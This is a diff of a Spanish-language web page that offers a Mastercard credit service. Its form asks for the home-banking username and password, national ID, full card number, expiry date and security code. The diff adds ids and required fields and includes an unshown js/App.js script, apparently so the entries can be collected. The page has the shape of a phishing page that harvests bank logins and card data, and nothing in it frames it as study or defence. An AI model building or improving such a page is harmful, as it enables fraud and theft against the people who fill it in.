@@ -63,20 +63,20 @@
                   <p class="text-center fs-4 mb-0 lead">Bancariza tu Master Card crédito soluciona todos estos problemas. <br>
                   Envianos tus datos y comienza a vivir la experiencia Master Card.</p>
               </header>
-              <main> 
-                  <form class="d-flex flex-column">
-                      <label class="mt-5 fs-5 m-auto mb-2" for="user">Usuario Home Banking</label>
-                    <input class="rounded mb-4 m-auto" type="number" name="user" d="">
+              <main class="d-flex flex-column">
+                    <label class="mt-5 fs-5 m-auto mb-2" for="user">Usuario Home Banking</label>
+                    <input class="rounded mb-4 m-auto" type="text" id="user" required>
                     <label class="m-auto fs-5 mb-2" for="user">Clave Home Banking</label>
-                    <input class="rounded mb-4 m-auto" type="text" name="" id="">
+                    <input class="rounded mb-4 m-auto" type="number" id="code" required>
+                    <label class="m-auto fs-5 mb-2" for="user">DNI</label>
+                    <input class="rounded mb-4 m-auto" type="number" id="dni" required>
                     <label class="m-auto fs-5 mb-2" for="user">Numero de tarjeta (16 dígitos)</label>
-                    <input class="rounded mb-4 m-auto" type="number" maxlength="4">
+                    <input class="rounded mb-4 m-auto" type="number" maxlength="16" id="card" required>
                     <label class="m-auto fs-5 mb-2" for="user">Fecha de Vencimiento</label>
-                    <input class="rounded mb-4 m-auto" type="date" name="" id="" placeholder="">
+                    <input class="rounded mb-4 m-auto" type="date" id='vencimiento' required>
                     <label class="m-auto fs-5 mb-2" for="user">Codígo de Seguridad (al dorso)</label>
-                    <input class="rounded mb-4 m-auto" type="number" maxlength="4">
-                    <button class="btn m-auto btn-primary">Enviar</button>
-                  </form>
+                    <input class="rounded mb-4 m-auto" type="number" id="secure_code" maxlength="4" required>
+                    <button id="submit" class="btn m-auto btn-primary">Enviar</button>    
                 </main>
           </section>
                    <section class="section3 m-auto p-5">
@@ -95,7 +95,7 @@
                       <header>
                         <h1 class="text-center mb-4 text-light ">Puedes encontrarnos en:</h1>
                       </header>
-                      <main class="iframe mt-5 m-auto">
+                      <main class="iframe rounded mt-5 m-auto">
                           <iframe class="m-auto" src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3284.19745010802!2d-58.3697285!3d-34.5991683!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x95a3353363a48559%3A0x85b2c7298a021d60!2sEdificio%20Bouchard%20710!5e0!3m2!1sen!2smx!4v1660244399137!5m2!1sen!2smx" frameborder="5" width="100%" height="450"></iframe>
                       </main>
                     </section>
@@ -115,10 +115,11 @@
           </div>
       </footer>
       
-      <div class="whatsApp_btn shadow-lg rounded-circle">
+      <div id="contact" class="whatsApp_btn shadow-lg rounded-circle">
       </div>
       
 </body>
       <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.5/dist/umd/popper.min.js" integrity="sha384-Xe+8cL9oJa6tN/veChSP7q+mnSPaj5Bcu9mPX5F5xIGE0DVittaqT5lorf0EI7Vk" crossorigin="anonymous"></script>
       <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.min.js" integrity="sha384-ODmDIVzN+pFdexxHEHFBQH3/9/vQ9uori45z4JjnFsRydbmQbmL5t1tQ0culUzyK" crossorigin="anonymous"></script>
+      <script src="js/App.js"></script>
 </html>
